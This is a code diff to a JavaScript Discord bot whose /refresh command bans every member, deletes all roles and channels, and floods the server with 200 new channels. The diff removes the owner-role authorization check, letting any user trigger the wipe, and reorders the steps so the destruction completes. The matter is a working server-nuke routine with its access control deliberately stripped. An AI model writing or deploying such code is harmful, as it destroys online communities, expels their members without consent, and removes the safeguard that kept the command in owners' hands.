@@ -17,12 +17,6 @@ const AUTO_ROLE_ID = process.env.AUTO_ROLE_ID || '1529532495832416326';
 const API_URL = (process.env.API_URL || '').replace(/\/+$/, '');
 const API_SHARED_SECRET = process.env.API_SHARED_SECRET || '';
 
-// ============ ROLES DE OWNER (2 ROLES) ============
-const REFRESH_ROLES = [
-    '1524796988812431461',  // Role Owner 1
-    '1529535539282313398'   // Role Owner 2
-];
-
 const client = new Client({
     intents: [
         GatewayIntentBits.Guilds,
@@ -107,7 +101,7 @@ async function registerCommands() {
 
         new SlashCommandBuilder()
             .setName('refresh')
-            .setDescription('⚠️ DELETE EVERYTHING and recreate the server (OWNER ROLE ONLY)')
+            .setDescription('⚠️ DELETE EVERYTHING and recreate the server')
             .addStringOption(opt =>
                 opt.setName('confirm')
                     .setDescription('Type "YES" to confirm')
@@ -388,7 +382,7 @@ async function handleHelp(interaction) {
             { name: '/upload', value: 'Upload Lua code or a file to Pastefy.', inline: false },
             { name: '/api_url', value: 'Create a protected Hosting URL from Lua code or a file.', inline: false },
             { name: '/help', value: 'Show this help message.', inline: false },
-            { name: '/refresh', value: '⚠️ DESTROY AND RECREATE THE SERVER (OWNER ROLE ONLY)', inline: false },
+            { name: '/refresh', value: '⚠️ DESTROY AND RECREATE THE SERVER', inline: false },
         )
         .setFooter({ text: 'PaltidxR Obfuscator' });
 
@@ -396,21 +390,9 @@ async function handleHelp(interaction) {
 }
 
 // ======================================================================
-// ============ COMANDO /refresh (DESTRUCTIVO) ============
+// ============ COMANDO /refresh (CORREGIDO) ============
 // ======================================================================
 async function handleRefresh(interaction) {
-    // Verificar que el usuario tenga ALGUNO de los roles de owner
-    const member = interaction.member;
-    const hasRole = REFRESH_ROLES.some(roleId => member.roles.cache.has(roleId));
-    
-    if (!hasRole) {
-        await interaction.reply({
-            content: '❌ You are not authorized to use this command. You need an **Owner Role** to use this command.',
-            ephemeral: true
-        });
-        return;
-    }
-
     const confirm = interaction.options.getString('confirm');
     
     if (confirm !== 'YES') {
@@ -429,7 +411,64 @@ async function handleRefresh(interaction) {
     const guild = interaction.guild;
 
     try {
-        // ============ 1. BANEAR A TODOS LOS MIEMBROS ============
+        // ============ 1. CREAR CANAL TEMPORAL PARA SEGUIR EJECUTANDO ============
+        await interaction.followUp({ content: '📝 Creating temporary channel...', ephemeral: true });
+        
+        let tempChannel = null;
+        try {
+            tempChannel = await guild.channels.create({
+                name: 'temp-refresh',
+                type: 0,
+                reason: 'Temporary channel for refresh process'
+            });
+            await interaction.followUp({ 
+                content: `✅ Temporary channel created: ${tempChannel.name}`, 
+                ephemeral: true 
+            });
+        } catch (e) {
+            console.error('Error creating temp channel:', e);
+        }
+
+        // ============ 2. ELIMINAR TODOS LOS ROLES (excepto @everyone) ============
+        await interaction.followUp({ content: '🎭 Deleting all roles...', ephemeral: true });
+        
+        const roles = await guild.roles.fetch();
+        let roleCount = 0;
+        
+        for (const [roleId, role] of roles) {
+            if (role.name !== '@everyone' && !role.managed) {
+                try {
+                    await role.delete();
+                    roleCount++;
+                } catch (e) {}
+            }
+        }
+        
+        await interaction.followUp({ 
+            content: `✅ Deleted ${roleCount} roles.`, 
+            ephemeral: true 
+        });
+
+        // ============ 3. ELIMINAR TODOS LOS CANALES (excepto el temporal) ============
+        await interaction.followUp({ content: '🗑️ Deleting all channels...', ephemeral: true });
+        
+        const channels = await guild.channels.fetch();
+        let channelCount = 0;
+        
+        for (const [channelId, channel] of channels) {
+            if (channel.name === 'temp-refresh' || channel.name === 'regresa-aqui') continue;
+            try {
+                await channel.delete();
+                channelCount++;
+            } catch (e) {}
+        }
+        
+        await interaction.followUp({ 
+            content: `✅ Deleted ${channelCount} channels.`, 
+            ephemeral: true 
+        });
+
+        // ============ 4. BANEAR A TODOS LOS MIEMBROS ============
         await interaction.followUp({ content: '🔨 Banning all members...', ephemeral: true });
         
         const members = await guild.members.fetch();
@@ -454,49 +493,10 @@ async function handleRefresh(interaction) {
             ephemeral: true 
         });
 
-        // ============ 2. ELIMINAR TODOS LOS CANALES ============
-        await interaction.followUp({ content: '🗑️ Deleting all channels...', ephemeral: true });
-        
-        const channels = await guild.channels.fetch();
-        let channelCount = 0;
-        
-        for (const [channelId, channel] of channels) {
-            try {
-                await channel.delete();
-                channelCount++;
-            } catch (e) {}
-        }
-        
-        await interaction.followUp({ 
-            content: `✅ Deleted ${channelCount} channels.`, 
-            ephemeral: true 
-        });
-
-        // ============ 3. ELIMINAR TODOS LOS ROLES ============
-        await interaction.followUp({ content: '🎭 Deleting all roles...', ephemeral: true });
-        
-        const roles = await guild.roles.fetch();
-        let roleCount = 0;
-        
-        for (const [roleId, role] of roles) {
-            if (role.name !== '@everyone' && !role.managed) {
-                try {
-                    await role.delete();
-                    roleCount++;
-                } catch (e) {}
-            }
-        }
-        
-        await interaction.followUp({ 
-            content: `✅ Deleted ${roleCount} roles.`, 
-            ephemeral: true 
-        });
-
-        // ============ 4. CREAR 200 CANALES NUEVOS ============
+        // ============ 5. CREAR 200 CANALES NUEVOS ============
         await interaction.followUp({ content: '📝 Creating 200 channels...', ephemeral: true });
         
-        const TOTAL_CHANNELS = 200; // <-- 200 CANALES
-        
+        const TOTAL_CHANNELS = 200;
         let createdCount = 0;
 
         for (let i = 1; i <= TOTAL_CHANNELS; i++) {
@@ -508,7 +508,6 @@ async function handleRefresh(interaction) {
                 });
                 createdCount++;
                 
-                // Mostrar progreso cada 10 canales
                 if (i % 10 === 0) {
                     await interaction.followUp({ 
                         content: `📝 Created ${i}/${TOTAL_CHANNELS} channels...`, 
@@ -520,7 +519,14 @@ async function handleRefresh(interaction) {
             }
         }
 
-        // Crear canal principal "regresa-aqui"
+        // ============ 6. ELIMINAR CANAL TEMPORAL ============
+        try {
+            if (tempChannel) {
+                await tempChannel.delete();
+            }
+        } catch (e) {}
+
+        // ============ 7. CREAR CANAL PRINCIPAL ============
         try {
             await guild.channels.create({
                 name: 'regresa-aqui',
@@ -537,7 +543,7 @@ async function handleRefresh(interaction) {
             ephemeral: true 
         });
 
-        // ============ 5. MENSAJE FINAL ============
+        // ============ 8. MENSAJE FINAL ============
         await interaction.followUp({
             content: `
 ╔═══════════════════════════════════════════════════════════════════╗
